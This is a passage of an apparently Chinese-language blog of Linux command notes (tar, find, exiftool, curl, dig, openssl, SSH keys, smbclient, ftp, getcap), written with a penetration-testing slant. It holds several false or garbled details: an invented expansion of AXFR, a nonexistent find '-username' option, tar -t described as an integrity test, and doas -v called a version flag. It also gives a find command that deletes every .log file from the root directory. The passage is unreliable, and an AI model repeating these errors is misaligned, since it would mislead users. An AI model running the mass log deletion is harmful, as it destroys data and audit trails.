<td>-x</td>
<td>提取归档文件中的内容。用于将归档文件解压缩并提取其中的文件。</td>
</tr>
<tr>
<td>-f</td>
<td>指定归档文件的名称。此选项后面必须跟上文件路径或文件名，用于告诉命令操作的文件。</td>
</tr>
<tr>
<td>-v</td>
<td>显示详细信息。在解压缩或归档时，使用此选项将列出正在处理的文件名，帮助用户追踪过程。</td>
</tr>
<tr>
<td>-z</td>
<td>如果归档是 gzip 压缩的，则解压。用于解压缩 <code>.gz</code> 格式的文件。</td>
</tr>
<tr>
<td>-j</td>
<td>如果归档是 bzip2 压缩的，则解压。用于解压缩 <code>.bz2</code> 格式的文件。</td>
</tr>
<tr>
<td>-J</td>
<td>如果归档是 xz 压缩的，则解压。用于解压缩 <code>.xz</code> 格式的文件。</td>
</tr>
<tr>
<td>-c</td>
<td>将输出发送到标准输出，而不是直接写入文件。常用于将归档内容输出到屏幕或另一个命令。</td>
</tr>
<tr>
<td>-t</td>
<td>测试归档文件是否完整，检查归档中的文件是否可以正常解压缩。</td>
</tr>
<tr>
<td>-u</td>
<td>更新归档文件。仅将比归档中现有文件更新的文件添加到归档。</td>
</tr>
<tr>
<td>-p</td>
<td>保留文件的原始权限和时间戳。在解压时不更改文件的时间戳和权限。</td>
</tr>
</tbody></table>
<h3 id="使用示例-3"><a href="#使用示例-3" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建压缩包</span></span><br><span class="line">tar czvf archive.tar.gz <span class="built_in">dir</span>/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压到指定目录</span></span><br><span class="line">tar xzvf archive.tar.gz -C /target/dir</span><br></pre></td></tr></table></figure></div>

<h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>find一个文件 后面可以跟上 -exec指定每找到一个就执行的命令 比如 -exec whami ;  后面要加上反斜杠和封号 告诉find不用解析后面的内容了（需要做的命令就这些）</p>
<h3 id="常用参数和示例"><a href="#常用参数和示例" class="headerlink" title="常用参数和示例"></a>常用参数和示例</h3><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>-username</code></td>
<td>指定用户名</td>
<td><code>find /home -username user1</code></td>
</tr>
<tr>
<td><code>-group</code></td>
<td>指定组</td>
<td><code>find /home -group admin</code></td>
</tr>
<tr>
<td><code>-type</code></td>
<td>指定要找的文件类型</td>
<td><code>find / -type f</code>（查找普通文件）<br><code>find / -type d</code>（查找目录）</td>
</tr>
<tr>
<td><code>-name</code></td>
<td>按文件名查找</td>
<td><code>find /home -name &quot;*.txt&quot;</code></td>
</tr>
<tr>
<td><code>-size</code></td>
<td>按文件大小查找</td>
<td><code>find / -size +10M</code>（查找大于10MB的文件）</td>
</tr>
<tr>
<td><code>-mtime</code></td>
<td>按修改时间查找</td>
<td><code>find / -mtime -7</code>（查找最近7天内修改的文件）</td>
</tr>
<tr>
<td><code>-exec</code></td>
<td>对找到的文件执行命令</td>
<td><code>find / -name &quot;*.log&quot; -exec rm &#123;&#125; \;</code></td>
</tr>
<tr>
<td><code>-perm</code></td>
<td>按权限查找</td>
<td><code>find / -perm 644</code></td>
</tr>
<tr>
<td><code>-user</code></td>
<td>按文件所有者查找</td>
<td><code>find / -user user1</code></td>
</tr>
<tr>
<td><code>-maxdepth</code></td>
<td>设置查找的最大深度</td>
<td><code>find / -maxdepth 2</code></td>
</tr>
</tbody></table>
<h2 id="–break-system-packages"><a href="#–break-system-packages" class="headerlink" title="–break-system-packages"></a>–break-system-packages</h2><p>新的kali和ubuntu中的pip指令直接安装会报错，pip3 install 后面加上这个指令才能安装（忽略风险）推荐使用docker安装</p>
<h2 id="exiftool"><a href="#exiftool" class="headerlink" title="exiftool"></a>exiftool</h2><p><code>exiftool</code> 是一个功能强大的命令行工具，用于读取、修改和删除文件的元数据（metadata）。它支持多种文件格式，包括图片、视频、音频、PDF 等，常用于处理 EXIF、IPTC、XMP 等类型的元信息。</p>
<h3 id="常用参数-5"><a href="#常用参数-5" class="headerlink" title="常用参数"></a>常用参数</h3><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>-common</code></td>
<td>显示常见的元数据信息</td>
<td><code>exiftool -common image.jpg</code></td>
</tr>
<tr>
<td><code>-all</code></td>
<td>显示所有元数据</td>
<td><code>exiftool -all image.jpg</code></td>
</tr>
<tr>
<td><code>-overwrite_original</code></td>
<td>修改文件时不生成备份</td>
<td><code>exiftool -overwrite_original -Artist=&quot;John Doe&quot; image.jpg</code></td>
</tr>
<tr>
<td><code>-Author</code></td>
<td>设置作者信息</td>
<td><code>exiftool -Author=&quot;John Doe&quot; image.jpg</code></td>
</tr>
<tr>
<td><code>-DateTimeOriginal</code></td>
<td>修改拍摄时间</td>
<td><code>exiftool -DateTimeOriginal=&quot;2024:01:30 12:00:00&quot; image.jpg</code></td>
</tr>
<tr>
<td><code>-GPSLatitude</code> &amp; <code>-GPSLongitude</code></td>
<td>设置GPS坐标</td>
<td><code>exiftool -GPSLatitude=40.7128 -GPSLongitude=-74.0060 image.jpg</code></td>
</tr>
<tr>
<td><code>-r</code></td>
<td>递归处理目录</td>
<td><code>exiftool -r -all /path/to/images</code></td>
</tr>
<tr>
<td><code>-d</code></td>
<td>格式化时间输出</td>
<td><code>exiftool -d &quot;%Y-%m-%d %H:%M:%S&quot; image.jpg</code></td>
</tr>
<tr>
<td><code>-delete_original</code></td>
<td>删除备份文件</td>
<td><code>exiftool -delete_original image.jpg</code></td>
</tr>
<tr>
<td><code>-tagsFromFile</code></td>
<td>从另一个文件复制元数据</td>
<td><code>exiftool -tagsFromFile source.jpg target.jpg</code></td>
</tr>
<tr>
<td><code>-fast</code></td>
<td>加快处理速度，但可能略微降低准确性</td>
<td><code>exiftool -fast image.jpg</code></td>
</tr>
<tr>
<td><code>-b</code></td>
<td>以二进制格式提取数据</td>
<td><code>exiftool -b -ThumbnailImage image.jpg &gt; thumb.jpg</code></td>
</tr>
<tr>
<td><code>-P</code></td>
<td>保留原始文件修改时间</td>
<td><code>exiftool -P -Artist=&quot;Jane Doe&quot; image.jpg</code></td>
</tr>
<tr>
<td><code>-X</code></td>
<td>以XML格式导出元数据</td>
<td><code>exiftool -X image.jpg &gt; metadata.xml</code></td>
</tr>
<tr>
<td><code>-csv</code></td>
<td>以CSV格式导出元数据</td>
<td><code>exiftool -csv image.jpg &gt; metadata.csv</code></td>
</tr>
</tbody></table>
<h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p><code>curl</code> 是一个非常强大的命令行工具，用于向服务器发送请求并接收响应。它支持多种协议（如 HTTP、HTTPS、FTP 等），常用于下载文件、测试接口、提交数据等操作。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>-o</code></td>
<td>保存输出到指定文件</td>
<td><code>curl -o output.html https://example.com</code></td>
</tr>
<tr>
<td><code>-O</code></td>
<td>以远程文件名保存</td>
<td><code>curl -O https://example.com/file.zip</code></td>
</tr>
<tr>
<td><code>-L</code></td>
<td>跟随重定向</td>
<td><code>curl -L https://example.com</code></td>
</tr>
<tr>
<td><code>-I</code></td>
<td>仅获取 HTTP 头信息</td>
<td><code>curl -I https://example.com</code></td>
</tr>
<tr>
<td><code>-X</code></td>
<td>指定 HTTP 方法</td>
<td><code>curl -X POST https://example.com/api</code></td>
</tr>
<tr>
<td><code>-H</code></td>
<td>添加 HTTP 头</td>
<td><code>curl -H &quot;Authorization: Bearer TOKEN&quot; https://api.example.com</code></td>
</tr>
<tr>
<td><code>-d</code></td>
<td>发送 POST 数据</td>
<td><code>curl -d &quot;name=John&amp;age=30&quot; -X POST https://example.com/form</code></td>
</tr>
<tr>
<td><code>-F</code></td>
<td>上传文件</td>
<td><code>curl -F &quot;file=@image.jpg&quot; https://example.com/upload</code></td>
</tr>
<tr>
<td><code>-u</code></td>
<td>认证（用户名:密码）</td>
<td><code>curl -u user:pass https://example.com/login</code></td>
</tr>
<tr>
<td><code>-k</code></td>
<td>跳过 SSL 证书验证</td>
<td><code>curl -k https://self-signed.example.com</code></td>
</tr>
</tbody></table>
<p>-X 指定访问方式 POST GET PUT<br>–data 指定具体参数</p>
<h2 id="tldr"><a href="#tldr" class="headerlink" title="tldr"></a>tldr</h2><p>它旨在提供简洁的命令行指令使用示例和说明，帮助用户快速了解命令的基本用法。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tldr</span><span class="meta"> [命令名称]</span></span><br></pre></td></tr></table></figure></div>

<h2 id="gocr"><a href="#gocr" class="headerlink" title="gocr"></a>gocr</h2><p><code>gocr</code> 是一个在 Linux 等系统中用于光学字符识别（OCR）的工具，它可以将图像中的文字提取并转换为可编辑的文本格式</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="code"><pre><span class="line">gocr image.jpg</span><br></pre></td></tr></table></figure></div>

<h2 id="doas"><a href="#doas" class="headerlink" title="doas"></a>doas</h2><p><code>doas</code>是一个用于在类 Unix 系统中以其他用户身份（通常是超级用户<code>root</code>）执行命令的工具，类似于<code>su</code>和<code>sudo</code>。以下是关于<code>doas</code>的基本信息和常用参数：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DIFF"><figure class="iseeu highlight /diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-n：不询问密码执行命令。但这需要在 doas 的配置文件中进行相应设置，允许特定用户或用户组在不输入密码的情况下执行某些命令。例如，在配置允许的情况下，doas -n some_command 可以直接执行命令而无需输入密码。</span></span><br><span class="line"><span class="deletion">-v：显示 doas 的版本信息。</span></span><br></pre></td></tr></table></figure></div>
<h3 id="使用示例-4"><a href="#使用示例-4" class="headerlink" title="使用示例"></a>使用示例</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 以 root 身份执行命令（类似 sudo）</span></span><br><span class="line">doas <span class="keyword">ls</span> <span class="string">/root</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以特定用户身份执行命令</span></span><br><span class="line">doas -u user <span class="keyword">ls</span> <span class="string">/home/user</span></span><br><span class="line"><span class="params">------------------------------</span></span><br><span class="line">（下面是配置文件中的内容）</span><br><span class="line"><span class="comment"># 允许用户执行所有命令（/etc/doas.conf）</span></span><br><span class="line">permit username</span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许用户以 root 身份执行指定命令</span></span><br><span class="line">permit username as root cmd <span class="string">/sbin/shutdown</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许用户无需密码执行某些命令</span></span><br><span class="line">permit nopass username as root cmd <span class="string">/sbin/reboot</span></span><br></pre></td></tr></table></figure>

<h2 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h2><p><code>dig</code>（Domain Information Groper）是一个用于查询 DNS（Domain Name System）信息的强大工具，在 Linux 系统中非常常用</p>
<p>在 dig 命令中，AXFR 是一种查询类型，用于请求 DNS 区域传输（ Authoritative Xerox File Replication）。它用于从主 DNS 服务器获取整个 DNS 区域的所有记录，通常用于备份 DNS 记录或在主 &#x2F; 辅助 DNS 服务器之间同步数据。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">dig @<span class="tag">&lt;<span class="name">DNS服务器</span>&gt;</span> <span class="tag">&lt;<span class="name">域名</span>&gt;</span> AXFR</span><br></pre></td></tr></table></figure></div>

<h3 id="使用示例-5"><a href="#使用示例-5" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查询域名的 A 记录</span></span><br><span class="line"><span class="keyword">dig </span>example.com A</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询域名的 MX 记录（邮件服务器）</span></span><br><span class="line"><span class="keyword">dig </span>example.com MX</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用指定的 DNS 服务器（如 8.8.8.8）进行查询</span></span><br><span class="line"><span class="keyword">dig </span>@<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span> example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取简短的查询结果</span></span><br><span class="line"><span class="keyword">dig </span>example.com +<span class="keyword">short</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="comment"># 追踪 DNS 解析过程</span></span><br><span class="line"><span class="keyword">dig </span>example.com +trace</span><br><span class="line"></span><br><span class="line"><span class="comment">#从指定dns服务器上查询，用@符号 </span></span><br><span class="line"><span class="keyword">dig </span>@<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span> abc.filterinto.com</span><br><span class="line"></span><br><span class="line"><span class="comment">#-x </span></span><br><span class="line"><span class="keyword">dig </span>@<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span> abc.filterinto.com</span><br><span class="line"></span><br><span class="line"><span class="comment">#精简输出 +short</span></span><br><span class="line"> <span class="keyword">dig </span>+<span class="keyword">short </span>abc.filterinto.com</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="resolv-conf"><a href="#resolv-conf" class="headerlink" title="resolv.conf"></a>resolv.conf</h2><p><code>resolv.conf</code> 是一个在类 Unix 系统（如 Linux、Unix、macOS 等）中非常重要的配置文件，它主要用于配置系统的 DNS（域名系统）解析相关信息。</p>
<ul>
<li>在大多数 Linux 系统中，<code>resolv.conf</code> 通常位于 <code>/etc/resolv.conf</code>。</li>
</ul>
<h2 id="etc-bind"><a href="#etc-bind" class="headerlink" title="&#x2F;etc&#x2F;bind"></a>&#x2F;etc&#x2F;bind</h2><p><code>/etc/bind</code> 是在 BIND（Berkeley Internet Name Domain）DNS 服务器软件的常见配置目录。BIND 是一个广泛使用的开源 DNS 服务器软件，用于实现域名解析服务。</p>
<h2 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h2><p><code>tr</code> 命令主要用于字符的替换、删除和压缩，它从标准输入读取数据，并将处理结果输出到标准输出。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">tr</span> <span class="selector-attr">[选项]</span> SET1 <span class="selector-attr">[SET2]</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>-c</code>：使用 <code>SET1</code> 的补集。即操作除 <code>SET1</code> 中字符以外的所有字符。</li>
<li><code>-d</code>：删除 <code>SET1</code> 中的字符，而不是替换它们。</li>
<li><code>-s</code>：将连续重复的字符压缩为一个字符。</li>
</ul>
<p>通常只能用来单个字符</p>
<h3 id="使用示例-6"><a href="#使用示例-6" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将小写字母转换为大写</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span> | <span class="built_in">tr</span> <span class="string">&#x27;a-z&#x27;</span> <span class="string">&#x27;A-Z&#x27;</span></span><br><span class="line"><span class="comment"># 输出: HELLO WORLD</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除数字</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;abc123xyz&quot;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;0-9&#x27;</span></span><br><span class="line"><span class="comment"># 输出: abcxyz</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 压缩连续的空格为单个空格</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello     world&quot;</span> | <span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="comment"># 输出: hello world</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 只保留字母，删除所有非字母字符</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;a1b2c3d4&quot;</span> | <span class="built_in">tr</span> -<span class="built_in">cd</span> <span class="string">&#x27;a-zA-Z&#x27;</span></span><br><span class="line"><span class="comment"># 输出: abcd</span></span><br></pre></td></tr></table></figure></div>

<h2 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h2><p><code>sed</code>（Stream Editor）是一个强大的流编辑器，它可以对文本流进行各种操作，包括查找、替换、删除、插入等。<code>sed</code> 主要用于对文件或标准输入进行逐行处理，并将处理结果输出。</p>
<ul>
<li><code>s/模式/替换内容/g</code>：这是最常用的命令，用于进行字符串替换。<ul>
<li><code>s</code> 表示替换操作。</li>
<li><code>模式</code> 是要查找和替换的内容。</li>
<li><code>替换内容</code> 是替换后的内容。</li>
<li><code>g</code> 表示全局替换，即对每一行中出现的所有匹配模式进行替换。如果不使用 <code>g</code>，则只替换每行中的第一个匹配项。</li>
</ul>
</li>
<li><code>d</code>：删除匹配模式的行。</li>
<li><code>p</code>：打印匹配模式的行。</li>
</ul>
<h3 id="使用示例-7"><a href="#使用示例-7" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 替换字符串</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span> | sed <span class="string">&#x27;s/world/universe/&#x27;</span></span><br><span class="line"><span class="comment"># 输出: hello universe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局替换</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;apple banana apple&quot;</span> | sed <span class="string">&#x27;s/apple/orange/g&#x27;</span></span><br><span class="line"><span class="comment"># 输出: orange banana orange</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除包含特定字符串的行</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;line1\nline2\nline3&quot;</span> | sed <span class="string">&#x27;/line2/d&#x27;</span></span><br><span class="line"><span class="comment"># 输出:</span></span><br><span class="line"><span class="comment"># line1</span></span><br><span class="line"><span class="comment"># line3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印匹配行</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;foo\nbar\nbaz&quot;</span> | sed -n <span class="string">&#x27;/ba/p&#x27;</span></span><br><span class="line"><span class="comment"># 输出:</span></span><br><span class="line"><span class="comment"># bar</span></span><br><span class="line"><span class="comment"># baz</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 仅替换第一行匹配项</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;apple\napple\napple&quot;</span> | sed <span class="string">&#x27;1s/apple/orange/&#x27;</span></span><br><span class="line"><span class="comment"># 输出:</span></span><br><span class="line"><span class="comment"># orange</span></span><br><span class="line"><span class="comment"># apple</span></span><br><span class="line"><span class="comment"># apple</span></span><br></pre></td></tr></table></figure></div>
<h2 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h2><p>在 Linux 系统中，<code>alias</code> 是一个用于创建命令快捷方式的功能。通过 <code>alias</code>，你可以将复杂或常用的命令定义为简短的名称，从而提高效率并减少重复输入。</p>
<h2 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"># AES 解密</span><br><span class="line">openssl enc -d -aes<span class="number">-256</span>-cbc -<span class="keyword">in</span> <span class="keyword">encrypted</span>.txt -<span class="keyword">out</span> decrypted.txt -k <span class="keyword">password</span></span><br><span class="line"></span><br><span class="line"># DES 解密</span><br><span class="line">openssl enc -d -des-ede3-cbc -<span class="keyword">in</span> <span class="keyword">encrypted</span>.txt -<span class="keyword">out</span> decrypted.txt -k <span class="keyword">password</span></span><br><span class="line"></span><br><span class="line"># RSA 解密</span><br><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> <span class="keyword">encrypted</span>.txt -inkey private_key.pem -<span class="keyword">out</span> decrypted.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>参数解释：<br>openssl enc: 这个命令用于对称加密或解密，enc 表示使用加密算法。</p>
<p>-d: 解密模式，表示对加密文件进行解密操作。<br>-aes-256-cbc: 指定加密算法为 AES，使用 256 位密钥和 CBC 模式。<br>-des-ede3-cbc: 指定加密算法为 DES，使用 3 重加密 (EDE3) 和 CBC 模式。<br>-in encrypted.txt: 输入的加密文件。<br>-out decrypted.txt: 解密后的输出文件。<br>-k password: 密钥，通常是密码形式的字符串，用于解密过程。<br>openssl rsautl: 用于进行 RSA 加密、解密或签名验证。</p>
<p>-decrypt: 解密模式，用于对使用 RSA 加密的文件进行解密。<br>-in encrypted.txt: 输入的加密文件。<br>-inkey private_key.pem: 指定私钥文件，私钥用于解密操作。<br>-out decrypted.txt: 解密后的输出文件。</p>
<h2 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h2><ul>
<li>将标准输入传递给其他命令。例如，echo “file1 file2 file3” | xargs ls，这条命令先通过echo输出文件名列表，然后xargs将这些文件名作为参数传递给ls命令，实现列出这些文件的信息。</li>
<li>-n选项可指定每次传递给命令的参数数量。例如echo {1..10} | xargs -n 3 echo，会将输入的数字每 3 个一组传递给echo命令，实现分组输出</li>
</ul>
<h2 id="id-rsa"><a href="#id-rsa" class="headerlink" title="id_rsa"></a>id_rsa</h2><p>这个文件通常存的是ssh的私钥 可以用ssh -i id_rsa来进行ssh 登录 但是这个文件的权限要先chmod 600<br>公钥文件权限是644</p>
<h2 id="ssh-authorized-keys"><a href="#ssh-authorized-keys" class="headerlink" title="~&#x2F;.ssh&#x2F;authorized_keys"></a>~&#x2F;.ssh&#x2F;authorized_keys</h2><p><code>~/.ssh/authorized_keys</code> 是一个 <strong>公钥认证</strong> 文件，它存储的是 <strong>可以用于无密码 SSH 登录该账户的公钥</strong>。</p>
<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a><strong>作用</strong></h3><p>当你尝试通过 SSH 登录到一个账户时（比如 <code>ssh user@host</code>），SSH 服务器会检查 <code>~/.ssh/authorized_keys</code> 文件，如果其中包含与你的私钥匹配的公钥，就允许你登录，而 <strong>无需输入密码</strong>。<br><code>~/.ssh/authorized_keys</code> <strong>支持在公钥前面指定 <code>command=</code> 选项</strong>，这样 <strong>每次有人使用该公钥登录时，就会自动执行指定的命令</strong>，而不会启动普通的 shell。</p>
<h3 id="用私钥生成公钥"><a href="#用私钥生成公钥" class="headerlink" title="用私钥生成公钥"></a>用私钥生成公钥</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">ssh-keygen -<span class="attribute">y</span> -f id_rsa &gt; authorized_keys</span><br></pre></td></tr></table></figure></div>
<p>📌 <strong>说明</strong>：</p>
<ul>
<li><code>-y</code>：从私钥中提取公钥</li>
<li><code>-f id_rsa</code>：指定私钥文件</li>
<li><code>&gt; authorized_keys</code>：输出公钥到文件</li>
<li></li>
</ul>
<h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><h3 id="Samba-简介"><a href="#Samba-简介" class="headerlink" title="Samba 简介"></a>Samba 简介</h3><p>在 Linux 中，SMB（Server Message Block）服务是一种网络文件共享协议，通常用于在网络中共享文件、打印机和其他资源。<br>SMB 最初由 Microsoft 开发，并且是 Windows 操作系统中广泛使用的文件共享协议。<br>在 Linux 系统中，SMB 服务通常由 Samba 软件提供支持。</p>
<h3 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h3><p>文件共享：允许在不同操作系统之间共享文件和目录。<br>打印机共享：允许在网络中共享打印机。<br>网络浏览：允许计算机查看和浏览网络中的共享资源。</p>
<h3 id="主要配置文件"><a href="#主要配置文件" class="headerlink" title="主要配置文件"></a>主要配置文件</h3><p>&#x2F;etc&#x2F;samba&#x2F;smb.conf：Samba 的主要配置文件，管理员在此设置共享目录、访问权限等。<br>smbclient：命令行工具，用于连接和访问 SMB 共享资源。</p>
<h3 id="smbclient-参数和使用"><a href="#smbclient-参数和使用" class="headerlink" title="smbclient 参数和使用"></a>smbclient 参数和使用</h3><p>-L：列出共享资源的信息。</p>
<p>-U：指定连接时使用的用户名。</p>
<p>&#x2F;&#x2F;：指定共享资源的路径，通常以 &#x2F;&#x2F;&lt;服务器地址&gt;&#x2F;&lt;共享名称&gt; 的格式指定。</p>
<p>示例：访问 server 上的共享目录 share：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">smbclient //<span class="keyword">server</span>/<span class="keyword">share</span> -U username</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DIFF"><figure class="iseeu highlight /diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-W：指定工作组名。</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-I：指定目标服务器的 IP 地址。</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-c：直接执行命令，不进入交互模式。</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-p：指定端口号，默认是 445。</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-N：跳过用户名密码提示，使用匿名方式。</span></span><br></pre></td></tr></table></figure></div>
<p>常用操作<br>下载文件：使用 get 命令下载文件。<br>上传文件：使用 put 命令上传文件。</p>
<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>FTP（File Transfer Protocol，文件传输协议）是一种用于在网络上传输文件的标准协议。它使用客户端 - 服务器模型，客户端通过 FTP 连接到服务器，上传或下载文件。FTP 默认使用端口 <code>21</code>。<br>ftp username@ip 登录ftp  如果要匿名登录 用户名就用anonymous</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ftp</span> anonymous@<span class="keyword">ftp</span>.example.com</span><br></pre></td></tr></table></figure></div>
<h3 id="常用交互命令（登录后使用）"><a href="#常用交互命令（登录后使用）" class="headerlink" title="常用交互命令（登录后使用）"></a>常用交互命令（登录后使用）</h3><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>user</code></td>
<td>重新输入用户名</td>
<td><code>user anonymous</code></td>
</tr>
<tr>
<td><code>pass</code></td>
<td>输入密码（匿名登录可留空）</td>
<td><code>pass</code></td>
</tr>
<tr>
<td><code>binary</code></td>
<td>设置为二进制传输模式</td>
<td><code>binary</code></td>
</tr>
<tr>
<td><code>ascii</code></td>
<td>设置为文本传输模式</td>
<td><code>ascii</code></td>
</tr>
<tr>
<td><code>get</code></td>
<td>下载单个文件</td>
<td><code>get file.txt</code></td>
</tr>
<tr>
<td><code>mget</code></td>
<td>下载多个文件（支持通配符）</td>
<td><code>mget *.log</code></td>
</tr>
<tr>
<td><code>put</code></td>
<td>上传单个文件</td>
<td><code>put backup.zip</code></td>
</tr>
<tr>
<td><code>mput</code></td>
<td>上传多个文件（支持通配符）</td>
<td><code>mput *.jpg</code></td>
</tr>
<tr>
<td><code>passive</code></td>
<td>切换被动模式状态</td>
<td><code>passive</code></td>
</tr>
<tr>
<td><code>ls</code></td>
<td>列出远程目录文件</td>
<td><code>ls /pub</code></td>
</tr>
<tr>
<td><code>cd</code></td>
<td>切换远程目录</td>
<td><code>cd /downloads</code></td>
</tr>
<tr>
<td><code>lcd</code></td>
<td>切换本地目录</td>
<td><code>lcd ~/Documents</code></td>
</tr>
<tr>
<td><code>quit</code>&#x2F;<code>bye</code></td>
<td>退出 FTP 会话</td>
<td><code>quit</code></td>
</tr>
</tbody></table>
<h2 id="getcap"><a href="#getcap" class="headerlink" title="getcap"></a>getcap</h2><p><code>getcap</code> 用于列出和显示指定文件的能力。能力是通过文件系统附加在可执行文件上的特定权限，能够控制该程序在运行时执行某些特权操作（如网络访问、文件访问等），而不需要完全的 root 权限。<br><strong><code>getcap &lt;file&gt;</code></strong>    显示指定文件的能力信息<br><strong><code>getcap -r &lt;directory&gt;</code></strong>    递归地列出指定目录及其子目录下所有文件的能力信息。<br><strong><code>getcap -v &lt;file&gt;</code></strong>    显示文件的详细能力信息</p>
<h3 id="能力（Capabilities）示例"><a href="#能力（Capabilities）示例" class="headerlink" title="能力（Capabilities）示例"></a><strong>能力（Capabilities）示例</strong></h3><ul>
